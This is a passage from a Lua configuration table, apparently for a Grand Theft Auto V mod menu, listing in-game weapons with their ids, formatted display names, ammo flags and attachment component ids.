                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~r~> ~s~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~r~> ~s~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~r~> ~s~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~r~> ~s~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~r~> ~s~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~r~> ~s~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {'Suppressor', id = 'COMPONENT_AT_PI_SUPP'}
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~r~> ~s~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~r~> ~s~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~r~> ~s~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~r~> ~s~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~r~> ~s~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~r~> ~s~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~r~> ~s~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~r~> ~s~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~r~> ~s~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~r~> ~s~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~r~> ~s~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~r~> ~s~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~r~> ~s~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~r~> ~s~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~r~> ~s~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {'name = Flashlight', id = 'COMPONENT_AT_AR_FLSH'}
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~r~> ~s~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~r~> ~s~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~r~> ~s~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~r~> ~s~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~r~> ~s~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~r~> ~s~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~r~> ~s~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~r~> ~s~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~r~> ~s~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~r~> ~s~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {name = '~h~~r~> ~s~Heavy', id = 'COMPONENT_AT_AR_BARREL_0'}
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
            name = '~h~~r~> ~s~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~r~> ~s~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~r~> ~s~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~r~> ~s~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
